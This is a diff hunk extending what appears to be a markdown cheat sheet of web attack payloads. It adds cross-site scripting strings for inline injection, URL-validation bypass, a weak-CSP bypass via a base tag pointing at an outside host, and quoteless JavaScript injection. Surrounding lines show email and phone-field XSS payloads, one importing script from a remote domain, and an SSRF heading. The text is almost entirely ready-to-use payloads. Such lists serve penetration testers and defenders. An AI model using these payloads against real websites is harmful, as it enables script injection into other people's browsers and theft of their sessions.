@@ -137,6 +137,27 @@ Mobile: 013371337;ext=<img/src/onerror=import('//domain/')>
 test@gmail.com%27\%22%3E%3Csvg/onload=alert(/xss/)%3E 
 test@gmail.com%2527%5C%2522%253E%253Csvg%2Fonload%3Dalert%28%2Fxss%2F%29%253E
 ```
+13-
+Main + Inline
+```
+1')"<!--><Svg OnLoad=(confirm)(1)<!--
+```
+Full URL Validation
+```
+JavaScript://%250Dtop.confirm?.(1)//
+```
+Weak CSP Bypass
+```
+1'"><!--><Base Href=//X55.is?
+```
+Regular JS Injection
+```
+1'-top['con\146irm'](1)-'
+```
+Quoteless JSi
+```
+/confirm?.(1)//\
+```
 # SSRF
 1-Try other URL schemes:<br>
 ```
